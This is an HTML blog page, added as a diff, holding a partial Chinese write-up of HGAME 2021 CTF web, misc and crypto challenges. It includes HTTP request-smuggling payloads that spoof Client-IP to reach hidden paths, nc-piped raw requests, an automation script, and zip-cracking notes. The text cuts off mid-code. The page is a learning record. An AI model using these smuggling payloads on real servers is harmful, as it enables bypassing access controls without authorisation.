@@ -1,0 +1,1497 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>HGAME2020部分writeup - 明月归的小站</title>
+  
+    <meta name="keywords" content="writeup">
+  
+
+  
+    <meta name="description" content="lai来了来了">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">HGAME2020部分writeup</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/">
+      HGAME2020部分writeup
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2021年1月30日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：6.3k字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：35分钟</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+  <div class="new-meta-item browse valine">
+    <a class='notlink'>
+      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+      
+      <span id="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/" class="leancloud_visitors" data-flag-title="HGAME2020部分writeup">
+      <p>
+        <span class="leancloud-visitors-count"></span>
+      </p>
+      </span>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+<div class="new-meta-item comments-count">
+  
+  <a href="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/#comments">
+    <i class="fas fa-comment-dots fa-fw"></i>
+    <span class="valine-comment-count" data-xid="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/">0</span>
+    <span class="leancloud-comments-count">&nbsp;</span>
+  </a>
+</div>
+
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>lai来了来了</p>
+<a id="more"></a>
+
+<h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h4><p>伪造http请求信息</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210130220919072.png" alt="image-20210130220919072"></p>
+<h4 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h4><p>控制台修改random函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.random &#x3D; function () &#123; return 10000 &#125;</span><br></pre></td></tr></table></figure>
+
+<p>找到这串</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gameOverShowText: <span class="function"><span class="keyword">function</span> (<span class="params">e, t</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(e &gt; <span class="number">1999</span>)&#123;</span><br><span class="line">    alert(<span class="built_in">window</span>.atob(<span class="string">&quot;aGdhbWV7ZG9feW91X2tub3dfY29jb3NfZ2FtZT99&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
+
+<p>base64解码就得到flag了</p>
+<h4 id="宝藏走私者"><a href="#宝藏走私者" class="headerlink" title="宝藏走私者"></a>宝藏走私者</h4><p>http走私 详情参考：<a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></p>
+<p>最终构造的请求头</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: thief.0727.site</span><br><span class="line">Content-Length: 72</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;secret HTTP&#x2F;1.1</span><br><span class="line">Host: thief.0727.site</span><br><span class="line">Client-IP: 127.0.0.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="智商检测鸡"><a href="#智商检测鸡" class="headerlink" title="智商检测鸡"></a>智商检测鸡</h4><p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span> integrate</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;http://r4u.top:5000/api/getQuestion&quot;</span></span><br><span class="line">burp1_url = <span class="string">&quot;http://r4u.top:5000/api/verify&quot;</span></span><br><span class="line">burp2_url = <span class="string">&quot;http://r4u.top:5000/api/getFlag&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r = s.get(burp0_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;all have done!&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    js = json.loads(r.text)</span><br><span class="line">    print(js)</span><br><span class="line">    soup = BeautifulSoup(js[<span class="string">&quot;question&quot;</span>],<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    min_symbol = soup.select(<span class="string">&quot;math:nth-child(1) &gt; mrow:nth-child(1) &gt; msubsup:nth-child(1) &gt; mrow:nth-child(2) &gt; mo:nth-child(1)&quot;</span>)[<span class="number">0</span>].get_text()</span><br><span class="line">    min_num = soup.select(<span class="string">&quot;math:nth-child(1) &gt; mrow:nth-child(1) &gt; msubsup:nth-child(1) &gt; mrow:nth-child(2) &gt; mn:nth-child(2)&quot;</span>)[<span class="number">0</span>].get_text()</span><br><span class="line">    max_num = soup.select(<span class="string">&quot;math:nth-child(1) &gt; mrow:nth-child(1) &gt; msubsup:nth-child(1) &gt; mrow:nth-child(3) &gt; mn:nth-child(1)&quot;</span>)[<span class="number">0</span>].get_text()</span><br><span class="line">    x_num = soup.select(<span class="string">&quot;math:nth-child(1) &gt; mrow:nth-child(1) &gt; mn:nth-child(3)&quot;</span>)[<span class="number">0</span>].get_text()</span><br><span class="line">    <span class="comment"># mid_symbol = soup.select(&quot;math:nth-child(1) &gt; mrow:nth-child(1) &gt; mo:nth-child(5)&quot;)[0].get_text()</span></span><br><span class="line">    static_num = soup.select(<span class="string">&quot;math:nth-child(1) &gt; mrow:nth-child(1) &gt; mn:nth-child(6)&quot;</span>)[<span class="number">0</span>].get_text()</span><br><span class="line">    print(min_symbol,min_num,max_num,x_num,static_num)</span><br><span class="line">    start = int(min_symbol+min_num)</span><br><span class="line">    stop = int(max_num)</span><br><span class="line">    x_num = int(x_num)</span><br><span class="line">    static_num = int(static_num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x</span>):</span></span><br><span class="line">        <span class="keyword">return</span> x_num*x+static_num</span><br><span class="line">    fArea,err = integrate.quad(func,start,stop)</span><br><span class="line">    fArea = Decimal(fArea).quantize(Decimal(<span class="string">&quot;0.1&quot;</span>), rounding = <span class="string">&quot;ROUND_HALF_UP&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;Integral area:&quot;</span>,fArea)</span><br><span class="line">    burp0_json = &#123;<span class="string">&quot;answer&quot;</span>: fArea&#125;</span><br><span class="line">    q = s.post(burp1_url,json=burp0_json)</span><br><span class="line">    print(q.text)</span><br><span class="line">print(s.get(burp2_url).text)</span><br></pre></td></tr></table></figure>
+
+<h4 id="走私者的愤怒"><a href="#走私者的愤怒" class="headerlink" title="走私者的愤怒"></a>走私者的愤怒</h4><p>构造CL-CL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: police.liki.link</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 71</span><br><span class="line">Content-Length: 3</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">GET &#x2F;secret HTTP&#x2F;1.1</span><br><span class="line">Host: police.liki.link</span><br><span class="line">Client-IP: 127.0.0.1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以出现两个400</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210202190556938.png" alt="image-20210202190556938"></p>
+<p>构造CL-TE</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: police.liki.link</span><br><span class="line"><span class="attribute">Content-Length</span>: 3</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /secret HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: police.liki.link</span><br><span class="line"><span class="attribute">Client-IP</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span>: 3</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>没反应 后来才知道 不能为1要是0 且最后要有回车换行 payload</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: police.liki.link</span><br><span class="line"><span class="attribute">Content-Length</span>: 94</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /secret HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: police.liki.link</span><br><span class="line"><span class="attribute">Client-IP</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span>: 3</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>自己构造的其它失败payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;GET / HTTP/1.1\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Host: police.liki.link\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;aa: \0bb\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;GET /secret HTTP/1.1\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Host: police.liki.link\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Client-IP: 127.0.0.1\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;\r\n&#x27;</span>\</span><br><span class="line">| nc police.liki.link 80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;GET / HTTP/1.1\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Host: thief.0727.site\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;aa: \0bb\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;GET /secret HTTP/1.1\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Host: 127.0.0.1\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Client-IP:127.0.0.1\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;\r\n&#x27;</span>\</span><br><span class="line">| nc thief.0727.site 80</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;GET / HTTP/1.1\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Host: police.liki.link\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;aa: \0bb\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;GET http://police.liki.link/secret HTTP/1.1\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;GET /secret HTTP/1.1\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Host: police.liki.link\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Client-IP: 127.0.0.1\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;\r\n&#x27;</span>\</span><br><span class="line">| nc police.liki.link 80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;GET / HTTP/1.1\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Host: police.liki.link\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;aa: \0bb\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;GET http://police.liki.link/secret HTTP/1.1\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;\r\n&#x27;</span>\</span><br><span class="line">| nc police.liki.link 80</span><br></pre></td></tr></table></figure>
+
+<p>POST请求的payload</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: police.liki.link</span><br><span class="line"><span class="attribute">Content-Length</span>: 104</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">POST /secret HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: police.liki.link</span><br><span class="line"><span class="attribute">Client-IP</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span>: 20</span><br><span class="line"></span><br><span class="line"><span class="attribute">233</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute"></span></span><br></pre></td></tr></table></figure>
+
+<p>其实就比之间的多加了Content-Length</p>
+<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h4><p>base64 + base32 + hex</p>
+<h4 id="不起眼压缩包的养成的方法"><a href="#不起眼压缩包的养成的方法" class="headerlink" title="不起眼压缩包的养成的方法"></a>不起眼压缩包的养成的方法</h4><p>binwalk分离出个压缩包 提示密码为图片id 搜了半天没搜到 直接爆破吧 密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">70415155</span><br></pre></td></tr></table></figure>
+
+<p>解压出来 明文攻击 这里推荐使用2345好压先查看算法 发现是zipcrypto store  使用7z压缩 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C8uvP$DP</span><br></pre></td></tr></table></figure>
+
+<p>解压之后hxd打开发现</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210131133703360.png" alt="image-20210131133703360"></p>
+<p>解实体编码得到flag</p>
+<h4 id="Galaxy"><a href="#Galaxy" class="headerlink" title="Galaxy"></a>Galaxy</h4><p>wireshark导出http对象 有张png图片 改大小就行</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210131192513620.png" alt="image-20210131192513620"></p>
+<h4 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h4><p>first.docx改成压缩包 在word/password.xml里找到 brainfuck编码的东西</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210131142504757.png" alt="image-20210131142504757"></p>
+<p>解码：<a target="_blank" rel="noopener" href="https://tool.bugku.com/brainfuck/">https://tool.bugku.com/brainfuck/</a></p>
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOYOUKNOWHIDDEN?</span><br></pre></td></tr></table></figure>
+
+<p>是另外一个word的密码 隐藏文字 下面的并不是全部都是一种字符 提示雪 猜测snow隐写 下载地址：</p>
+<p><a target="_blank" rel="noopener" href="http://www.darkside.com.au/snow/">http://www.darkside.com.au/snow/</a></p>
+<p>用格式刷去掉下面的线 复制出来保存文本中 使用下面命令 不指定密码得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SNOW.EXE -C 1.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="まひと"><a href="#まひと" class="headerlink" title="まひと"></a>まひと</h4><p>摩斯密码 用这个解 <a target="_blank" rel="noopener" href="http://www.zhongguosou.com/zonghe/moersicodeconverter.aspx">http://www.zhongguosou.com/zonghe/moersicodeconverter.aspx</a></p>
+<p>接着ascii转字符串</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s= [<span class="number">86</span>,<span class="number">109</span>,<span class="number">108</span>,<span class="number">110</span>,<span class="number">90</span>,<span class="number">87</span>,<span class="number">53</span>,<span class="number">108</span>,<span class="number">99</span>,<span class="number">109</span>,<span class="number">85</span>,<span class="number">116</span>,<span class="number">84</span>,<span class="number">71</span>,<span class="number">108</span>,<span class="number">114</span>,<span class="number">97</span>,<span class="number">84</span>,<span class="number">112</span>,<span class="number">57</span>,<span class="number">86</span>,<span class="number">109</span>,<span class="number">116</span>,<span class="number">116</span>,<span class="number">100</span>,<span class="number">107</span>,<span class="number">112</span>,<span class="number">105</span>,<span class="number">73</span>,<span class="number">84</span>,<span class="number">70</span>,<span class="number">89</span>,<span class="number">100</span>,<span class="number">69</span>,<span class="number">70</span>,<span class="number">52</span>,<span class="number">90</span>,<span class="number">83</span>,<span class="number">70</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">69</span>,<span class="number">48</span>,<span class="number">120</span>,<span class="number">101</span>,<span class="number">48</span>,<span class="number">48</span>,<span class="number">114</span>,<span class="number">79</span>,<span class="number">88</span>,<span class="number">104</span>,<span class="number">120</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">74</span>,<span class="number">85</span>,<span class="number">84</span>,<span class="number">86</span>,<span class="number">57</span>,<span class="number">79</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">53</span>,<span class="number">106</span>,<span class="number">85</span>,<span class="number">109</span>,<span class="number">99</span>,<span class="number">48</span>,<span 